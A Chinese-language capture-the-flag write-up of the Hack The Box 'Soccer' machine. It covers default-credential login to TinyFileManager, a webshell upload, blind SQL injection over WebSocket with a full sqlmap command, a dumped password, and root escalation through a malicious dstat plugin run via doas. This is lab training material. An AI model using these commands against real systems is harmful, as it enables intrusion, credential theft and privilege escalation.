nmap 結果
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
```

原始碼中看到這個 但這其實只是用來驗證 library 的完整性的
![image](https://hackmd.io/_uploads/SySbjrnGyg.png)

預設的字典檔沒有爆出東西(記得要試不同的)
爆出一個 `/tiny`

連上去跳轉到一個叫 TinyFileManager 的登入頁面 從原始碼中可以找到他的 sourcecode
![image](https://hackmd.io/_uploads/B1XGZI2zye.png)

然後找到他的預設密碼登入

![image](https://hackmd.io/_uploads/S1PXWUnGJe.png)

可以看到裡面就是 soccer.htb 的目錄檔案管理器
裡頭有個 uploads 資料夾 能成功上傳圖片並讀取到 應該就是從這裡上傳 webshell 

![image](https://hackmd.io/_uploads/Syj7f83MJe.png)

成功上傳 webshell
![image](https://hackmd.io/_uploads/HJQWD8hMye.png)

把 reverse shell encode 一下 成功 getshell
想去讀取 user.txt 但沒有權限 想說找 有沒有 sql 或 ssh 的密碼但都沒有發現 翻了超級無敵久去看 writeup 
發現是要去找他的 subdomain 可以在 `/etc/nginx/sites-available` 找到 `soc-player.soccer.htb` 或是從 `/etc/hosts` 看也可以

![image](https://hackmd.io/_uploads/SkIV7vnfJl.png)

加進 `/etc/host` 後成功進來

![image](https://hackmd.io/_uploads/BJf9mDnfyx.png)

先目錄爆破 
```
Login                   [Status: 200, Size: 3307, Words: 778, Lines: 99, Duration: 313ms]
check                   [Status: 200, Size: 31, Words: 6, Lines: 1, Duration: 272ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 271ms]
img                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 388ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 268ms]
login                   [Status: 200, Size: 3307, Words: 778, Lines: 99, Duration: 276ms]
logout                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 276ms]
match                   [Status: 200, Size: 10078, Words: 4012, Lines: 404, Duration: 279ms]
signup                  [Status: 200, Size: 3741, Words: 1015, Lines: 105, Duration: 278ms]
```

`http://soc-player.soccer.htb/check` 發現有 SQLi 漏洞
![image](https://hackmd.io/_uploads/H185ownMyl.png)
![image](https://hackmd.io/_uploads/rJyYowhMyg.png)

加上看原始碼有使用到 websocket
![image](https://hackmd.io/_uploads/r1230v2zJx.png)

可以參考這篇 [SQLi+WebScoket](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

用他的 payload 可以爆出來
但好像用這個就可以了
```
sqlmap -u ‘ws://soc-player.soccer.htb:9091’ –data ‘{“id”:”*”}’ --technique=B –risk 3 –level 5 –batch –dbs
```

sqlmap 參數可以加上 `--exclude-sysdbs` 不要列出預設的表 不然 time-based 跑很久

透過出來的資料去 ssh 連線
```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

上傳 linpeas 沒找到東西 用 `find / -perm -4000 2>/dev/null` 看有哪些可以是有 user 權限且可以用 root 身份執行 

可以發現有一個叫做 doas 的

![image](https://hackmd.io/_uploads/SJTYj8aMke.png)

他是一種類似 sudo 的東東

![image](https://hackmd.io/_uploads/Bk2jpLaMkl.png)

從 `man doas` 可以看到有一個 config file 可以進行讀取

![image](https://hackmd.io/_uploads/By7TWvaf1e.png)

讀取後得知在 `/usr/bin/dstat` 下的 command 可以以 root 身份執行![image](https://hackmd.io/_uploads/Bk5MMw6Mye.png)

再去查 dstat 是一個用於監控系統資源的東東 在 `man dstat` 可以知道 使用 `--list` 可以列出所有可用插鍵 也可參考[這個](https://gtfobins.github.io/gtfobins/dstat/)

並且都存在 `usr/local/share/dstat` 然後檔名必須為 `dstat_filename.py` 執行時 --後面的 file name
![image](https://hackmd.io/_uploads/SyKDIwafJe.png)

因此可以建一個 shell 在 dstat 然後利用 doas 以 root 身份執行這件事成功提權
```
import os
os.system("/bin/bash")
```

`doas /usr/bin/dstat --good` 成功提權

![image](https://hackmd.io/_uploads/SJcVYvaz1e.png)

